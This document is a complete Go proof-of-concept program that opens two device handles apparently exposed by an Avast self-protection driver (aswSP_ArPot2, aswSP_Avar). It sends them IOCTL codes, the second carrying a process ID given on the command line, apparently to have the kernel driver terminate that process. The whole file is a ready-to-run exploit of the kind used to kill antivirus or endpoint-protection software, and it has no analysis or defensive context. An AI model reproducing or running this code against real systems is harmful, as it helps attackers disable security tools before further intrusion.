package main

import (
	"fmt"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("usage: poc.go pid")
		return
	}

	if os.Args[1] == "-h" {
		fmt.Println("usage: poc.go pid")
		return
	}

	// Load kernel32.dll
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	CreateFile := kernel32.NewProc("CreateFileW")
	DeviceIoControl := kernel32.NewProc("DeviceIoControl")
	CloseHandle := kernel32.NewProc("CloseHandle")

	// Open first volume
	volumename := syscall.StringToUTF16Ptr("\\\\.\\aswSP_ArPot2")
	hVolume, _, err := CreateFile.Call(
		uintptr(unsafe.Pointer(volumename)),
		uintptr(0xc0000000), // GENERIC_READ | GENERIC_WRITE
		uintptr(0),          // No sharing
		uintptr(0),          // No security attributes
		uintptr(syscall.OPEN_EXISTING),
		uintptr(0x80), // FILE_ATTRIBUTE_NORMAL
		uintptr(0),
	)
	if hVolume == uintptr(syscall.InvalidHandle) {
		fmt.Printf("Failed to open device: %v\n", err)
		return
	}

	// Send first DeviceIoControl
	var local_1c uint32
	_, _, err = DeviceIoControl.Call(
		hVolume,
		uintptr(0x7299c004),
		uintptr(0), // lpInBuffer
		uintptr(4), // nInBufferSize
		uintptr(0), // lpOutBuffer
		uintptr(0), // nOutBufferSize
		uintptr(unsafe.Pointer(&local_1c)),
		uintptr(0),
	)

	// Open second volume
	volumename = syscall.StringToUTF16Ptr("\\\\.\\aswSP_Avar")
	local_c, _, err := CreateFile.Call(
		uintptr(unsafe.Pointer(volumename)),
		uintptr(0xc0000000), // GENERIC_READ | GENERIC_WRITE
		uintptr(0),          // No sharing
		uintptr(0),          // No security attributes
		uintptr(syscall.OPEN_EXISTING),
		uintptr(0x80), // FILE_ATTRIBUTE_NORMAL
		uintptr(0),
	)
	if local_c == uintptr(syscall.InvalidHandle) {
		fmt.Printf("Failed to open device: %v\n", err)
		return
	}

	// Convert PID to uint32 and send second DeviceIoControl
	pid, _ := strconv.Atoi(os.Args[1])
	processID := uint32(pid)
	var local_2c uint32
	_, _, err = DeviceIoControl.Call(
		local_c,
		uintptr(0x9988c094),
		uintptr(unsafe.Pointer(&processID)),
		uintptr(4), // nInBufferSize
		uintptr(0), // lpOutBuffer
		uintptr(0), // nOutBufferSize
		uintptr(unsafe.Pointer(&local_2c)),
		uintptr(0),
	)

	// Close handles
	CloseHandle.Call(hVolume)
	CloseHandle.Call(local_c)
}
